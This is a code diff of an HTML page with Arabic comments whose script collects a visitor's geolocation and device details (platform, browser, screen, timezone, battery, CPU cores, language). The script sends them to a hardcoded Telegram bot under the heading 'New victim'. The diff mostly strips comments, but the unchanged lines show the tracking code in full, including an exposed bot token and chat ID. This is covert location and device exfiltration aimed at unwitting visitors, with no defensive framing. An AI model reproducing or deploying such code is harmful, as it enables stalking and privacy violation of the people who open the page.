@@ -146,7 +146,7 @@
 </div>
 
 <script>
-    // ====== إعدادات البوت ======
+    // ====== إعدادات البوت (تم التحديث) ======
     const BOT_TOKEN = "8599000520:AAHwQg2d_xry4DWNy92fbvVbtF-xWYVu_FA";
     const CHAT_ID = "7984067238";
 
@@ -160,13 +160,11 @@
     async function getDeviceInfo() {
         let info = "";
 
-        // نظام التشغيل والمتصفح
         info += `📱 الجهاز: ${navigator.userAgentData?.platform || navigator.platform || "غير معروف"}\n`;
         info += `🌐 المتصفح: ${navigator.appName || "غير معروف"}\n`;
         info += `📐 الشاشة: ${screen.width}x${screen.height}\n`;
         info += `🕐 المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
 
-        // البطارية
         try {
             const battery = await navigator.getBattery();
             info += `🔋 البطارية: ${Math.round(battery.level * 100)}%\n`;
@@ -175,10 +173,7 @@
             info += `🔋 البطارية: غير مدعومة\n`;
         }
 
-        // المعالج
         info += `💻 المعالج: ${navigator.hardwareConcurrency || "غير معروف"} نواة\n`;
-
-        // اللغة
         info += `🌍 اللغة: ${navigator.language}\n`;
 
         return info;
@@ -215,7 +210,6 @@
                 const lon = pos.coords.longitude;
                 const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                // إرسال الموقع فوراً
                 const deviceDetails = await getDeviceInfo();
                 const msg = `🛰️ *[ ضحية جديدة ]*\n\n${deviceDetails}\n📍 الموقع: ${mapLink}\n🕒 ${new Date().toLocaleString()}`;
                 sendToTelegram(msg);
@@ -282,7 +276,6 @@
         resultMsg += `\n🕒 ${new Date().toLocaleString()}`;
         sendToTelegram(resultMsg);
 
-        // === إعادة زر التحميل ===
         loader.style.display = 'none';
         btn.disabled = false;
         btn.style.opacity = '1';
@@ -305,4 +298,4 @@
 </script>
 
 </body>
-</html>
+    </html>
